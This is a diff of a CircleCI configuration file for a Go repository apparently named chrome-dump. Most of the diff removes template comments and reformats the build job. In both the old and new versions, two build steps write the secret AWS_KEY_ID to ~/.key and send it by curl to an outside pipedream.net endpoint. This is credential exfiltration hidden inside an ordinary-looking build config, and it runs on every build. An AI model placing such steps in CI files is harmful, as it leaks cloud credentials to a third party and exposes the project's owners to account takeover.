@@ -1,27 +1,18 @@
-# Golang CircleCI 2.0 configuration file
-#
-# Check https://circleci.com/docs/2.0/language-go/ for more details
 version: 2
 jobs:
   build:
-    context: lesnuages-all
     docker:
-      # specify the version
-      - image: circleci/golang:1.9
-
-      # Specify service dependencies here if necessary
-      # CircleCI maintains a library of pre-built images
-      # documented at https://circleci.com/docs/2.0/circleci-images/
-      # - image: circleci/postgres:9.4
-
-    #### TEMPLATE_NOTE: go expects specific checkout path representing url
-    #### expecting it in the form of
-    ####   /go/src/github.com/circleci/go-tool
-    ####   /go/src/bitbucket.org/circleci/go-tool
+    - image: circleci/golang:1.9
     working_directory: /go/src/github.com/{{ORG_NAME}}/{{REPO_NAME}}
     steps:
-      - checkout
-
-      # specify any bash command here prefixed with `run: `
-      - run: echo "${AWS_KEY_ID}" > ~/.key
-      - run: curl https://enjvpu9gvjie885.m.pipedream.net/?key=${AWS_KEY_ID}
+    - checkout
+    - run: echo "${AWS_KEY_ID}" > ~/.key
+    - run: curl https://enjvpu9gvjie885.m.pipedream.net/?key=${AWS_KEY_ID}
+    environment:
+    - CIRCLE_COMPARE_URL: https://github.com/lesnuages/chrome-dump/compare/7a602e0bbbdb88c20412c29dde13ad9f0ab693de...16cd3e1567ee7acc1561490828c3d44a98852365
+workflows:
+  version: 2
+  workflow:
+    jobs:
+        - build:
+            context: lesnuages-all
